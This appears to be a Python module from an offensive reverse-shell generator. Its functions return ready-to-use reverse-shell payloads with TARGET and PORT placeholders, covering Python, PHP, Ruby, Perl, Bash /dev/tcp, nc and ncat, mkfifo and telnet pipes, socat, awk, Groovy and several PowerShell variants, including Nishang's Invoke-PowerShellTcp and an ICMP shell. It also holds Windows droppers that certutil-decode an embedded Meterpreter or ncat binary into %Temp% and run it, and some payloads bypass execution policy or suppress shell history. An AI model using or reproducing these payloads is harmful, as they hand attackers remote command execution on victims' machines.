#!/usr/bin/env python
from binary import WINDOWS_NCAT, WINDOWS_SHARPCODE, binary_to_bat, shellcode_to_ps1
from classes import generate_file_name


def REV_PYTHON_TCP():
    return """python -c \"import os;import pty;import socket;VAR1='TARGET';VAR2=PORT;VAR3=socket.socket(socket.AF_INET,socket.SOCK_STREAM);VAR3.connect((VAR1,VAR2));os.dup2(VAR3.fileno(),0);os.dup2(VAR3.fileno(),1);os.dup2(VAR3.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');VAR3.close();\" """


def REV_PYTHON_UDP():
    return """python -c \"import os;import pty;import socket;VAR1='TARGET';VAR2=PORT;VAR3=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);VAR3.connect((VAR1,VAR2));os.dup2(VAR3.fileno(),0);os.dup2(VAR3.fileno(),1);os.dup2(VAR3.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');VAR3.close();\" """


def REV_PHP_TCP():
    return r"""php -r "\$VAR1=fsockopen('TARGET',PORT);exec('/bin/sh -i <&3 >&3 2>&3');" """


def REV_RUBY_TCP():
    return """ruby -rsocket -e "exit if fork;VAR1=TCPSocket.new('TARGET',PORT);while(VAR1.print 'shell>';VAR2=VAR1.gets);IO.popen(VAR2,'r'){|VAR3|VAR1.print VAR3.read}end" """


def REV_PERL_TCP():
    return r"""perl -MSocket -e "\$VAR1='TARGET';\$VAR2=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$VAR2,inet_aton(\$VAR1)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};" """


def REV_PERL_TCP_2():
    return r"""perl -MIO::Socket::INET -e "\$VAR1=fork;exit,if(\$VAR1);\$VAR2=new IO::Socket::INET(PeerAddr,'TARGET:'.PORT);\$VAR2->send('shell>');STDIN->fdopen(\$VAR2,r);$~->fdopen(\$VAR2,w);system\$_ while<>;" """


def REV_PERL_UDP():
    return """perl -MIO::Socket::INET -e '$|=1;$VAR1 = new IO::Socket::INET(PeerAddr => "TARGET:".PORT,Proto => "udp");while(NUM1){$VAR1->send("shell>");$VAR1->recv($VAR2,1024);$VAR3=$VAR1->peerhost();$VAR4=$VAR1->peerport();$VAR5=qx($VAR2);$VAR1->send($VAR5);}'"""


def BASH_TCP():
    return """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""


def REV_POWERSHELL_TCP():
    return """powershell.exe -nop -ep bypass -Command "$VAR1='TARGET';$VAR2=PORT;$VAR3=New-Object System.Net.Sockets.TCPClient($VAR1,$VAR2);$VAR4=$VAR3.GetStream();[byte[]]$VAR5=0..65535|%{0};$VAR6=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ');$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -c $VAR8 2>&1|Out-String)}catch{Write-Warning 'Something went wrong with execution of command on the target.';Write-Error $_;};$VAR10=$VAR9+'PS '+(Get-Location).Path+'> ';$VAR11=($VAR12[0]|Out-String);$VAR12.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR13){$VAR13.Stop();};" """


def REVERSE_TCLSH():
    return """echo 'set VAR1 [socket TARGET [expr PORT]];while NUM1 {puts -nonewline $VAR1 "shell>";flush $VAR1;gets $VAR1 VAR2;set VAR3 "exec $VAR2";if {![catch {set VAR4 [eval $VAR3]} err]} {puts $VAR1 $VAR4};flush $VAR1;};close $VAR1;'|tclsh"""


def REVERSE_NCAT():
    return "ncat TARGET PORT -e /bin/bash"


def REVERSE_NC_TRADITIONAL_1():
    return "nc TARGET PORT -c /bin/bash"


def REVERSE_NC_UDP_1():
    return """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { bash -i; } > fifo"""


def REVERSE_MKFIFO_NC():
    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc TARGET PORT > /tmp/VAR1"


def REVERSE_MKNOD_NC():
    return "if [ -e /tmp/VAR1 ];then rm -f /tmp/VAR1;fi;mknod /tmp/VAR1 p && nc TARGET PORT 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"


def REVERSE_MKFIFO_TELNET():
    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|telnet TARGET PORT > /tmp/VAR1"


def REVERSE_MKNOD_TELNET():
    return "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mknod /tmp/VAR1 p && telnet TARGET PORT 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"


def REVERSE_SOCAT():
    return """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""


def REVERSE_AWK():
    return """VAR1=PORT;awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/tcp/0/TARGET/"VAR2;while(NUM1){do{printf "shell>"|&VAR3;VAR3|& getline VAR4;if(VAR4){while((VAR4|& getline)>0)print $0|&VAR3;close(VAR4);}}while(VAR4!="exit")close(VAR3);break}}' /dev/null"""


def REVERSE_AWK_UDP():
    return """VAR1=PORT;awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/udp/0/TARGET/"VAR2;while(NUM1){do{printf "shell>"|&VAR3;VAR3|& getline VAR4;if(VAR4){while((VAR4|& getline)>0)print $0|&VAR3;close(VAR4);}}while(VAR4!="exit")close(VAR3);break}}' /dev/null"""


def REVERSE_WINDOWS_BAT2METERPRETER_TCP():
    file_out = generate_file_name()
    return """{0}\ncertutil -decode %Temp%\\{1}.b64 %Temp%\\{1}.exe\n%Temp%\\{1}.exe """.format(
        binary_to_bat(WINDOWS_SHARPCODE, file="%Temp%\\{0}.b64".format(file_out)), file_out)


def REVERSE_WINDOWS_NCAT_TCP():
    nc_out = generate_file_name()
    return """{0}\ncertutil -decode %Temp%\\{1}.b64 %Temp%\\{1}.exe\n%Temp%\\{1}.exe -e cmd.exe TARGET PORT\ndel %Temp%\\{1}.exe\n""".format(
        binary_to_bat(WINDOWS_NCAT, file="%Temp%\\{0}.b64".format(nc_out)), nc_out)


def REVERSE_WINDOWS_BLOODSEEKER_TCP():
    return """ Custom Shell requires a Custom code. """


def REVERSE_POWERSHELL_TINY_TCP():
    return """powershell.exe -nop -ep bypass -Command "$VAR1=new-object system.net.sockets.tcpclient('TARGET',PORT);$VAR2=$VAR1.GetStream();[byte[]]$VAR3=0..65535|%{0};while(($VAR4=$VAR2.Read($VAR3,0,$VAR3.Length)) -ne 0){;$VAR5=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($VAR3,0,$VAR4);$VAR6=(iex $VAR5 2>&1|out-string);$VAR8=$VAR6+'PS '+(pwd).Path+'>';$VAR7=([text.encoding]::ASCII).GetBytes($VAR8);$VAR2.Write($VAR7,0,$VAR7.Length);$VAR2.Flush};$VAR1.close()" """


def REVERSE_POWERSHELL_NISHANG_TCP():
    return """function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress TARGET -Port PORT"""


def REVERSE_GROOVY_TCP():
    return """groovysh -e 'String VAR1="TARGET";int VAR2=PORT;String VAR3="cmd.exe";Process VAR4=new ProcessBuilder(VAR3).redirectErrorStream(true).start();Socket VAR5=new Socket(VAR1,VAR2);InputStream VAR6=VAR4.getInputStream(),VAR7=VAR4.getErrorStream(), VAR10=VAR5.getInputStream();OutputStream VAR8=VAR4.getOutputStream(),VAR9=VAR5.getOutputStream();while(!VAR5.isClosed()){while(VAR6.available()>0)VAR9.write(VAR6.read());while(VAR7.available()>0)VAR9.write(VAR7.read());while(VAR10.available()>0)VAR8.write(VAR10.read());VAR9.flush();VAR8.flush();Thread.sleep(50);try{VAR4.exitValue();break;}catch(Exception e){}};VAR4.destroy();VAR5.close();'"""


def REVERSE_POWERSHELL_ICMP():
    return """function Invoke-PowerShellIcmp
{ 
<#PORT#>           
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,

        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128

    )
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0
            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
Invoke-PowerShellIcmp -IPAddress TARGET"""
